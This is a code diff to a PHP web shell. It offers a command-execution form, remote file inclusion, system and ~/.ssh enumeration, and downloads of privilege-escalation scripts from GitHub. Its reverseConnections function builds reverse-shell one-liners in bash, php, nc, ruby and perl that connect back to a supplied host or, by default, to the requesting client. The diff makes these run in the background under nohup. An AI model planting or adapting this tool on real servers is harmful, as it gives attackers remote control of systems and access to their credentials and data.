@@ -65,7 +65,7 @@ function cloner($repo, $os)
     $repos = array(
 
         "linux" => "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh",
-        "WinBAT"=> "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat",
+        "WinBAT" => "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat",
         "WinEXEANY" => "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe",
         "default" => "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py"
 
@@ -108,56 +108,65 @@ function showEnv($os)
     if (!empty($os)) {
         if ($os[1] == 'Linux') {
             return shell_exec('env');
-        } elseif($os == "Windows") {
+        } elseif ($os == "Windows") {
             return shell_exec("SET");
-        }else{
+        } else {
             return null;
         }
     }
     return null;
 }
+
 function reverseConnections($methods, $host, $port, $shell)
 {
-    ini_set("display_errors", "1");
-    error_reporting(E_ALL);
+    $errorNum = error_get_last();
     $defaultPort = 1634;
-    if (!empty($_SERVER["HTTP_CLIENT_IP"]) && empty($host)){
-        $host = $_SERVER["HTTP_cLIENT_IP"];
+    $defaultHost = $_SERVER["REMOTE_ADDR"];
+    $defaultShell = "/bin/bash";
+
+    $useHost = null;
+    $usePort = null;
+    $useShell = null;
+
+
+    if (empty($host)) {
+        echo "\nHost was empty, using: " . $defaultHost . "\n";
+        $useHost = $defaultHost;
     }else{
-        $host = $host;
+        $useHost = $host;
     }
-    
-    if (!empty($shell)) {
-        $shell = $shell;
-    } else {
-        echo "Shell was not specified, using /bin/sh as the default.";
-        $shell = "/bin/sh";
+    if (empty($shell)) {
+        echo "\nShell was empty, using default: " . $defaultShell . "\n";
+        $useShell = $defaultShell;
+    }else{
+        $useShell = $shell;
     }
-    if (empty($host) && empty($port)){
-        echo "You did not specify a host, selecting ".$host." and ".$port." for our use.";
-        $port = $defaultPort;
+    if (empty($port)) {
+        echo "\nPort was empty, using default: " . $defaultPort . "\n";
+        $usePort = $defaultPort;
+    }else{
+        $usePort = $port;
     }
     $comma = array(
-        "bash" => "bash -i >& /dev/tcp/" . $host . "/" . $port . " 0>&1",
-        "php" => "php -r '\$sock=fsockopen($host.,$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
-        "nc"  => "nc -e " . $shell . " " . $host . " " . $port,
-        "ncS" => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " . $host . " " . $port . " >/tmp/f",
-        "ruby" => "ruby -rsocket -e'f=TCPSocket.open(".$host.",".$port.").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
-        "perl" => "perl -e 'use Socket;\$i=".$host.";\$p=".$port.";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+        "bash" => "nohup bash -i >& /dev/tcp/" . $useHost . "/" . $usePort . " 0>&1 &",
+        "php" => "nohup php -r '\$sock=fsockopen(" . $useHost . "," . $usePort . ");exec(\"/bin/sh -i <&3 >&3 2>&3\");' &",
+        "nc" => "nohup nc -e " . $useShell . " " . $useHost . " " . $usePort . " &",
+        "ncS" => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nohup nc " . $useHost . " " . $usePort . " >/tmp/f &",
+        "ruby" => "nohup ruby -rsocket -e'f=TCPSocket.open(" . $useHost . "," . $usePort . ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' &",
+        "perl" => "nohup perl -e 'use Socket;\$i=" . $useHost . ";\$p=" . $usePort . ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' &",
 
 
     );
-    $errorNum = error_get_last();
+    $defaultAction = $comma["bash"];
     if (!empty($methods)) {
-        echo "Attempting to connect back, ensure you have the listener running.\n";
-        echo "using ".$methods."\non: ". $host."\nport: ".$port."\nshell: ".$shell."\n";
-        
-        shell_exec($comma[$methods]) || die("Something went wrong: ->".$errorNum);
-    }else{
-        $defaultAction = $comma["bash"];
-        echo "You didnt specify a method to use, defaulting to bash.\n";
-        echo "\nRhost: ". $host."\nRport: ".$port."\nLshell: ".$shell."\n";
-        shell_exec($defaultAction) || die("\nThere was an error at the connection\n->Error\n".$errorNum);
+        echo "\nAttempting to connect back, ensure you have the listener running.\n";
+        echo "\nUsing: " . $methods . "\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n";
+
+        shell_exec($comma[$methods]) || die("Something went wrong: ->" . $errorNum . "\r\n\r\n\r\n");
+    } else {
+        echo "\nYou didnt specify a method to use, defaulting to bash.\n";
+        echo "\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n";
+        shell_exec($defaultAction) || die("\nThere was an error at the connection\n->Error\n" . $errorNum . "\r\n\r\n\r\n");
     }
 }
 
@@ -190,6 +199,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         remoteFileInclude($_POST["doInclude"]);
     } elseif (!empty($_POST["b6"])) {
         echo "Future editions will have this.";
+        //b64();
     } elseif ($_POST["rcom"]) {
         reverseConnections($_POST["mthd"], $_POST["host"], $_POST["port"], $_POST["shell"]);
     } else {
@@ -325,99 +335,100 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 </head>
 
 <body>
-    <div id="container-mid">
-        <div class="article-mid">
-            <p><b>~ Safe mode? ~</b></p>
-            <td>
-                <tr><?=
-                        $safemode = ini_get('safe_mode');
-                    if ($safemode) {
-                        echo "<p> <b>Safe Mode: </b><font color='red'>" . $safemode . "</font></p>";
-                    } else {
-                        echo "<p> <b>Safe Mode is: </b><font style='text-color:green;background-color:lightgrey;'>off.</font</p>";
-                    }
-                    ?>
-                </tr><br>
-            </td>
-        </div>
-    </div>
-    <div id="container-left">
-        <article id="article-left">
-            <h1 class="main_tool_label">~ System info's ~</h1>
-            <div>
-                <?=
-                    $h = '';
-                echo "<b>Can we reach it?</b>";
-                if (checkdnsrr('github.com', 'ANY')) {
-                    echo "<p><font style='text-color: green;'>Github is Reachable!</font></p><form action='' method='post'><input type='text' name='clone'><input type='submit' value='Clone it!'></form>";
+<div id="container-mid">
+    <div class="article-mid">
+        <p><b>~ Safe mode? ~</b></p>
+        <td>
+            <tr><?=
+                $safemode = ini_get('safe_mode');
+                if ($safemode) {
+                    echo "<p> <b>Safe Mode: </b><font color='red'>" . $safemode . "</font></p>";
                 } else {
-                    echo "<p><font style='text-color: red;'>Github is Not Reachable!</font></p>";
+                    echo "<p> <b>Safe Mode is: </b><font style='text-color:green;background-color:lightgrey;'>off.</font></p>";
                 }
                 ?>
-            </div>
-            <div>
-                <a>
-                    <b>Avail Commands:</b>
-                    <br>
-                    <br>
-                    <?= checkComs() ?>
-                    <br>
-                </a>
-            </div>
-            <div>
-                <a><b>Available Shells:</b><br><br>
-                    <?= checkShells() ?>
-                    <br></a>
-            </div>
-            <div>
-                <a><b> Protections:</b><br><br>
-                    <?= parseProtections() ?>
-                    <br></a>
-            </div>
-            <div>
-                <a><b> Package Managers: </b><br><br>
-                    <?= checkPack() ?>
-                    <br></a>
-            </div>
-            <div>
-                <a><br><b>Sys/Env info:</b><br><br>
-                    <?= showEnv(checkSystem()) ?>
-                </a>
-            </div>
-        </article>
+            </tr>
+            <br>
+        </td>
     </div>
-    <div id="divider">
-    </div>
-    <div id="container-right">
-        <article id="article-right">
-            <h1 class="main_tool_label">~ Commands ~</h1>
-            <div>
-                <?php
-                $base = 'echo "Users Home Dir:";echo $HOME;echo"";echo "SSH Directory?";ls -lah $HOME/.ssh/;echo "";echo "Current Dir: ";pwd;ls -lah;echo "";echo "System: ";uname -as;echo "";echo "User: ";whoami';
-                executeCommands($base);
-                ?>
-                <a>
-                    <br>
-                    <b> ~ Execute ~ </b>
-                    <br>
-                </a>
-                <form method='post' action=''>
-                    <input type='text' name='commander' value=''>
-                    <input type='submit' value='Execute'></form>
-            </div>
-            <div>
-                <a>
-                    <b>~ Remote or Local File Include ~ </b>
-                </a>
+</div>
+<div id="container-left">
+    <article id="article-left">
+        <h1 class="main_tool_label">~ System info's ~</h1>
+        <div>
+            <?=
+            $h = '';
+            echo "<b>Can we reach it?</b>";
+            if (checkdnsrr('github.com', 'ANY')) {
+                echo "<p><font style='text-color: green;'>Github is Reachable!</font></p><form action='' method='post'><input type='text' name='clone'><input type='submit' value='Clone it!'></form>";
+            } else {
+                echo "<p><font style='text-color: red;'>Github is Not Reachable!</font></p>";
+            }
+            ?>
+        </div>
+        <div>
+            <a>
+                <b>Avail Commands:</b>
                 <br>
-                <form method="post" action=''>
-                    <input type="text" name="doInclude">
-                    <input type="submit" value="Fetch it!">
-                </form>
+                <br>
+                <?= checkComs() ?>
+                <br>
+            </a>
+        </div>
+        <div>
+            <a><b>Available Shells:</b><br><br>
+                <?= checkShells() ?>
+                <br></a>
+        </div>
+        <div>
+            <a><b> Protections:</b><br><br>
+                <?= parseProtections() ?>
+                <br></a>
+        </div>
+        <div>
+            <a><b> Package Managers: </b><br><br>
+                <?= checkPack() ?>
+                <br></a>
+        </div>
+        <div>
+            <a><br><b>Sys/Env info:</b><br><br>
+                <?= showEnv(checkSystem()) ?>
+            </a>
+        </div>
+    </article>
+</div>
+<div id="divider">
+</div>
+<div id="container-right">
+    <article id="article-right">
+        <h1 class="main_tool_label">~ Commands ~</h1>
+        <div>
+            <?php
+            $base = 'echo "Users Home Dir:";echo $HOME;echo"";echo "SSH Directory?";ls -lah $HOME/.ssh/;echo "";echo "Current Dir: ";pwd;ls -lah;echo "";echo "System: ";uname -as;echo "";echo "User: ";whoami';
+            executeCommands($base);
+            ?>
+            <a>
+                <br>
+                <b> ~ Execute ~ </b>
+                <br>
+            </a>
+            <form method='post' action=''>
+                <input type='text' name='commander' value=''>
+                <input type='submit' value='Execute'></form>
+        </div>
+        <div>
+            <a>
+                <b>~ Remote or Local File Include ~ </b>
+            </a>
+            <br>
+            <form method="post" action=''>
+                <input type="text" name="doInclude">
+                <input type="submit" value="Fetch it!">
+            </form>
 
-            </div>
-        </article>
-    </div>
+        </div>
+    </article>
+</div>
 </body>
 
 </html>
